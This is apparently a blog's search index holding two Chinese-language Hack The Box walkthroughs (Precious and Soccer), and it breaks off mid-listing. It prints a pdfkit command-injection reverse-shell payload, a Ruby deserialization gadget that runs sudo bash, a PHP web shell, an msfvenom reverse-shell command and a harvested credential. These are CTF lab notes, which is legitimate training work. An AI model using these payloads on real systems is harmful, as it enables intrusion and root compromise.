<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HTB-Precious</title>
    <link href="/2022/12/26/HTB-Precious/"/>
    <url>/2022/12/26/HTB-Precious/</url>
    
    <content type="html"><![CDATA[<h1 id="Precious"><a href="#Precious" class="headerlink" title="Precious"></a>Precious</h1><h2 id="NMAP-Enumeration"><a href="#NMAP-Enumeration" class="headerlink" title="NMAP Enumeration"></a>NMAP Enumeration</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs !">PORT   STATE SERVICE REASON  VERSION<br>22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)<br>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEAPxqUubE88njHItE+mjeWJXOLu5reIBmQHCYh2ETYO5zatgel+LjcYdgaa4KLFyw8CfDbRL9swlmGTaf4iUbao4jD73HV9/Vrnby7zP04OH3U/wVbAKbPJrjnva/czuuV6uNz4SVA3qk0bp6wOrxQFzCn5OvY3FTcceH1jrjrJmUKpGZJBZZO6cp0HkZWs/eQi8F7anVoMDKiiuP0VX28q/yR1AFB4vR5ej8iV/X73z3GOs3ZckQMhOiBmu1FF77c7VW1zqln480/AbvHJDULtRdZ5xrYH1nFynnPi6+VU/PIfVMpHbYu7t0mEFeI5HxMPNUvtYRRDC14jEtH6RpZxd7PhwYiBctiybZbonM5UP0lP85OuMMPcSMll65+8hzMMY2aejjHTYqgzd7M6HxcEMrJW7n7s5eCJqMoUXkL8RSBEQSmMUV8iWzHW0XkVUfYT5Ko6Xsnb+DiiLvFNUlFwO6hWz2WG8rlZ3voQ/gv8BLVCU1ziaVGerd61PODck=<br>|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)<br>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFScv6lLa14Uczimjt1W7qyH6OvXIyJGrznL1JXzgVFdABwi/oWWxUzEvwP5OMki1SW9QKX7kKVznWgFNOp815Y=<br>|   256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)<br>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH+JGiTFGOgn/iJUoLhZeybUvKeADIlm0fHnP/oZ66Qb<br>80/tcp open  http    syn-ack nginx 1.18.0<br>|_http-title: Did not follow redirect to http://precious.htb/<br>| http-methods: <br>|_  Supported Methods: GET HEAD POST OPTIONS<br>|_http-server-header: nginx/1.18.0<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br></code></pre></td></tr></table></figure><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="80-x2F-tcp"><a href="#80-x2F-tcp" class="headerlink" title="80&#x2F;tcp"></a>80&#x2F;tcp</h3><ul><li>造訪 <a href="http://10.10.11.189/">http://10.10.11.189</a><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">會redirect到precious.htb<br>必須先加到/etc/hosts<br></code></pre></td></tr></table></figure><img src="https://i.imgur.com/79R52oV.png"></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">給他一個url，他會將html page轉成pdf<br>利用exiftool去查看pdf內容<br><br>exiftool 48wxd3knvdh5s59j19ql6fe7k4dobph2.pdf<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs !">ExifTool Version Number         : 12.44<br>File Name                       : 48wxd3knvdh5s59j19ql6fe7k4dobph2.pdf<br>Directory                       : .<br>File Size                       : 48 kB<br>File Modification Date/Time     : 2022:12:25 20:32:03-05:00<br>File Access Date/Time           : 2022:12:25 20:32:10-05:00<br>File Inode Change Date/Time     : 2022:12:25 20:32:08-05:00<br>File Permissions                : -rw-r--r--<br>File Type                       : PDF<br>File Type Extension             : pdf<br>MIME Type                       : application/pdf<br>PDF Version                     : 1.4<br>Linearized                      : No<br>Page Count                      : 2<br>Creator                         : Generated by pdfkit v0.8.6<br></code></pre></td></tr></table></figure><h2 id="EntryPoint"><a href="#EntryPoint" class="headerlink" title="EntryPoint"></a>EntryPoint</h2><ul><li>pdfkit<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">pdfkit 0.8.7以下 存在Command Injection漏洞<br><br>https://github.com/CyberArchitect1/CVE-2022-25765-pdfkit-Exploit-Reverse-Shell<br></code></pre></td></tr></table></figure></li></ul><h3 id="Get-Shell"><a href="#Get-Shell" class="headerlink" title="Get Shell"></a>Get Shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">構造Command Injection<br><br>payload:<br>http%3a%2f%2f10.10.14.8%3a1234%2f%3fname%3d%2520%60%20ruby%20-rsocket%20-e&#x27;spawn(%22sh%22%2c%5b%3ain%2c%3aout%2c%3aerr%5d%3d%3eTCPSocket.new(%2210.10.14.8%22%2c6666))&#x27;%60<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/h4YXp8H.png"></p><ul><li>Reverse Shell<br><img src="https://i.imgur.com/RnYH3KD.png"></li></ul><h2 id="提權"><a href="#提權" class="headerlink" title="提權"></a>提權</h2><ul><li><p>&#x2F;etc&#x2F;passwd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs !">root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>sync:x:4:65534:sync:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:109::/nonexistent:/usr/sbin/nologin<br>sshd:x:104:65534::/run/sshd:/usr/sbin/nologin<br>henry:x:1000:1000:henry,,,:/home/henry:/bin/bash<br>systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin<br>systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin<br>ruby:x:1001:1001::/home/ruby:/bin/bash<br>_laurel:x:997:997::/var/log/laurel:/bin/false<br></code></pre></td></tr></table></figure></li><li><p>找到hanry使用者密碼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">grep -nir &quot;henry&quot; 2&gt;/dev/null<br><br>.bundle/config:2:BUNDLE_HTTPS://RUBYGEMS__ORG/: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot;<br></code></pre></td></tr></table></figure></li><li><p>切換到hanry使用者 sudo -l</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> henry on <span class="hljs-symbol">precious:</span><br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span><br><br><span class="hljs-title class_">User</span> henry may run the following commands on <span class="hljs-symbol">precious:</span><br>    (root) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/ruby /opt/update_dependencies.rb<br></code></pre></td></tr></table></figure></li></ul><h3 id="Ruby-Deserialization"><a href="#Ruby-Deserialization" class="headerlink" title="Ruby Deserialization"></a>Ruby Deserialization</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs !">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md<br><br>---<br>- !ruby/object:Gem::Installer<br>    i: x<br>- !ruby/object:Gem::SpecFetcher<br>    i: y<br>- !ruby/object:Gem::Requirement<br>  requirements:<br>    !ruby/object:Gem::Package::TarReader<br>    io: &amp;1 !ruby/object:Net::BufferedIO<br>      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry<br>         read: 0<br>         header: &quot;abc&quot;<br>      debug_output: &amp;1 !ruby/object:Net::WriteAdapter<br>         socket: &amp;1 !ruby/object:Gem::RequestSet<br>             sets: !ruby/object:Net::WriteAdapter<br>                 socket: !ruby/module &#x27;Kernel&#x27;<br>                 method_id: :system<br>             git_set: sudo bash<br>         method_id: :resolve<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">sudo ruby /opt/update_dependencies.rb<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/qdyCONN.png"></p><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><ul><li>user<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">635dfa84ea29ad043681acf88c4ef533<br></code></pre></td></tr></table></figure></li><li>root<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">310a4bb75b4b420af95f236fce20f918<br></code></pre></td></tr></table></figure><img src="https://i.imgur.com/SgF8NxR.png"></li></ul>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
      <category>靶機</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pdfkit</tag>
      
      <tag>ruby</tag>
      
      <tag>Ruby Deserialization</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Soccer</title>
    <link href="/2022/12/25/HTB-Soccer/"/>
    <url>/2022/12/25/HTB-Soccer/</url>
    
    <content type="html"><![CDATA[<h1 id="Soccer"><a href="#Soccer" class="headerlink" title="Soccer"></a>Soccer</h1><h2 id="NMAP-enumeration"><a href="#NMAP-enumeration" class="headerlink" title="NMAP enumeration"></a>NMAP enumeration</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs !">PORT     STATE SERVICE         REASON         VERSION<br>22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)<br>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG+9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6+N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0+aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0=<br>|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)<br>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD+EqFcmc0ngWeRLfCr68+uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk=<br>|   256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)<br>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/<br>80/tcp   open  http            syn-ack ttl 63 nginx 1.18.0 (Ubuntu)<br>|_http-title: Did not follow redirect to http://soccer.htb/<br>| http-methods: <br>|_  Supported Methods: GET HEAD POST OPTIONS<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>9091/tcp open  xmltec-xmlmail? syn-ack ttl 63<br>| fingerprint-strings: <br>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: <br>|     HTTP/1.1 400 Bad Request<br>|     Connection: close<br>|   GetRequest: <br>|     HTTP/1.1 404 Not Found<br>|     Content-Security-Policy: default-src &#x27;none&#x27;<br>|     X-Content-Type-Options: nosniff<br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 139<br>|     Date: Sat, 24 Dec 2022 07:01:03 GMT<br>|     Connection: close<br>|     &lt;!DOCTYPE html&gt;<br>|     &lt;html lang=&quot;en&quot;&gt;<br>|     &lt;head&gt;<br>|     &lt;meta charset=&quot;utf-8&quot;&gt;<br>|     &lt;title&gt;Error&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;pre&gt;Cannot GET /&lt;/pre&gt;<br>|     &lt;/body&gt;<br>|     &lt;/html&gt;<br>|   HTTPOptions, RTSPRequest: <br>|     HTTP/1.1 404 Not Found<br>|     Content-Security-Policy: default-src &#x27;none&#x27;<br>|     X-Content-Type-Options: nosniff<br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 143<br>|     Date: Sat, 24 Dec 2022 07:01:03 GMT<br>|     Connection: close<br>|     &lt;!DOCTYPE html&gt;<br>|     &lt;html lang=&quot;en&quot;&gt;<br>|     &lt;head&gt;<br>|     &lt;meta charset=&quot;utf-8&quot;&gt;<br>|     &lt;title&gt;Error&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;<br>|     &lt;/body&gt;<br>|_    &lt;/html&gt;<br></code></pre></td></tr></table></figure><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="80-x2F-tcp"><a href="#80-x2F-tcp" class="headerlink" title="80&#x2F;tcp"></a>80&#x2F;tcp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">造訪網頁http://10.10.11.194<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/S5LfQ7N.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">添加 /etc/hosts<br>10.10.11.194 soccer.htb<br><br>造訪 http://soccer.htb/<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/ESss2pE.png"></p><ul><li>dirsearch<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs !">Target: http://soccer.htb/<br><br>[02:06:16] Starting: <br>[02:06:23] 403 -  564B  - /.ht_wsr.txt<br>[02:06:23] 403 -  564B  - /.htaccess.bak1<br>[02:06:23] 403 -  564B  - /.htaccess.save<br>[02:06:23] 403 -  564B  - /.htaccess.sample<br>[02:06:23] 403 -  564B  - /.htaccess.orig<br>[02:06:23] 403 -  564B  - /.htaccessOLD2<br>[02:06:23] 403 -  564B  - /.htaccessBAK<br>[02:06:23] 403 -  564B  - /.htaccessOLD<br>[02:06:23] 403 -  564B  - /.htaccess_extra<br>[02:06:23] 403 -  564B  - /.htaccess_sc<br>[02:06:23] 403 -  564B  - /.htaccess_orig<br>[02:06:23] 403 -  564B  - /.html<br>[02:06:23] 403 -  564B  - /.htm<br>[02:06:23] 403 -  564B  - /.htpasswd_test<br>[02:06:23] 403 -  564B  - /.htpasswds<br>[02:06:23] 403 -  564B  - /.httr-oauth<br>[02:06:45] 403 -  564B  - /admin/.htaccess<br>[02:06:55] 403 -  564B  - /administrator/.htaccess<br>[02:06:59] 403 -  564B  - /app/.htaccess<br>[02:07:24] 200 -    7KB - /index.html<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">沒看出甚麼結果<br>改用fuff掃大一點的檔案試試<br><br>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -X POST -u http://soccer.htb/FUZZ<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/MRsgzWF.png"></p><ul><li>訪問 &#x2F;tiny&#x2F;<br><img src="https://i.imgur.com/22rqoh8.png"></li></ul><h2 id="EntryPoint"><a href="#EntryPoint" class="headerlink" title="EntryPoint"></a>EntryPoint</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">根據<br>https://github.com/febinrev/tinyfilemanager-2.4.3-exploit<br>的腳本，找到一組憑據可能是預設的?<br>admin/admin@123<br>試著登入<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/TbOcKlT.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">本來想試著上傳文件<br>結果似乎沒權限<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/u1fNz8U.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">後來發現要在uploads文件夾才有權限上傳<br>構造惡意語法並上傳<br>&lt;?php system($_GET[&#x27;a&#x27;]); ?&gt;<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/0U4JL6o.png"></p><h2 id="Get-Shell"><a href="#Get-Shell" class="headerlink" title="Get Shell"></a>Get Shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">網頁會自動清除uploads的檔案<br>怕影響到反連，所以用msfvenom產了一個shell上傳並執行<br>msfvenom -p linux/x64/shell_reverse_tcp lhost=10.10.14.8 lport=443 -f elf &gt; mal<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/hnMx24Q.png"></p><h2 id="提權"><a href="#提權" class="headerlink" title="提權"></a>提權</h2><ul><li><p>netstat -antp</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.53:53</span>           <span class="hljs-number">0.0.0.0</span>:*               LISTEN      -                   <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:22</span>              <span class="hljs-number">0.0.0.0</span>:*               LISTEN      -                   <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.1:3000</span>          <span class="hljs-number">0.0.0.0</span>:*               LISTEN      -                   <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:9091</span>            <span class="hljs-number">0.0.0.0</span>:*               LISTEN      -                   <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.1:33060</span>         <span class="hljs-number">0.0.0.0</span>:*               LISTEN      -                   <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.1:3306</span>          <span class="hljs-number">0.0.0.0</span>:*               LISTEN      -                   <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:80</span>              <span class="hljs-number">0.0.0.0</span>:*               LISTEN      <span class="hljs-number">1093</span>/nginx: worker  <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>     <span class="hljs-number">15</span> <span class="hljs-number">10.10.11.194:47840</span>      <span class="hljs-number">10.10.14.8:443</span>          ESTABLISHED <span class="hljs-number">2311</span>/sh             <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.1:3306</span>          <span class="hljs-number">127.0.0.1:41290</span>         ESTABLISHED -                   <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.1:41290</span>         <span class="hljs-number">127.0.0.1:3306</span>          ESTABLISHED -                   <br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">10.10.11.194:9091</span>       <span class="hljs-number">10.10.14.8:42182</span>        ESTABLISHED -                   <br><span class="hljs-attribute">tcp6</span>       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> :::<span class="hljs-number">22</span>                   :::*                    LISTEN      -                   <br><span class="hljs-attribute">tcp6</span>       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> :::<span class="hljs-number">80</span>                   :::*                    LISTEN      <span class="hljs-number">1093</span>/nginx: worker<br></code></pre></td></tr></table></figure></li><li><p>試著訪問端口3000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">#kali<br>./chisel_1.7.7_linux_amd64 server -p 8000 -reverse<br><br>#Victim<br>./chisel_1.7.7_linux_amd64 client 10.10.14.8:8000 R:socks<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/YYC3Ksh.png"></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">設置完代理並訪問<br>會得到一個很像的網頁<br>但有登入以及註冊功能<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/OMR1uFU.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">註冊並登入會導向/check<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/PTc1Tds.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">檢查輸入框參數，會送一個id的GET請求，看來我們可以利用id送資料<br>但直接在url輸入並沒有反應<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/POfqHy0.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">檢查網頁原始碼，發現參數會送一個ws請求出去驗證ticket是否有效<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Yjq3Lm5.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">不能使用sqlmap直接對ws協議做Injection<br>參考這篇網址構造Middleware server<br>https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html<br><br># 需添加soc-player子域到/etc/hosts<br></code></pre></td></tr></table></figure><ul><li><p>ws_sqli.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 